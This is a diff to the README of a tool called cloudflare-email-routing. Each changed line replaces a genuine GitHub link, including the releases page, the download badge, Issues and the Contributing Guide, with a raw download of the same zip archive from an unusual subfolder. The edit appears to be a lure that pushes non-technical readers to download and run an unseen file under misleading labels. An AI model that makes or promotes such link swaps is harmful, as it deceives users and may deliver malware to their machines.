@@ -4,14 +4,14 @@
 Welcome to cloudflare-email-routing! This application offers an easy way to manage your email routing and forwarding using Cloudflare Workers. With our tool, you can quickly set up DNS settings and redirect your emails to your chosen inbox. No technical skills are required—just follow the steps below.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
+[![Download](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:
-   [Go to Releases Page](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
+   [Go to Releases Page](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)
 
 2. **Select Your Version**  
    A list of versions will appear. Choose the latest stable release for the best results. If you find a version that meets your needs, click on it.
@@ -69,8 +69,8 @@ We welcome contributions! If you want to help make this application better, fork
 This project is open-source and available under the MIT License. You can use it freely with proper attribution.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
-- [Issues](https://github.com/nvqlong1234/cloudflare-email-routing/issues)
-- [Contributing Guide](https://github.com/nvqlong1234/cloudflare-email-routing/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)
+- [Issues](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/nvqlong1234/cloudflare-email-routing/main/pinguinitescent/cloudflare-email-routing_1.0.zip)
 
 Download the application now and start simplifying your email routing!
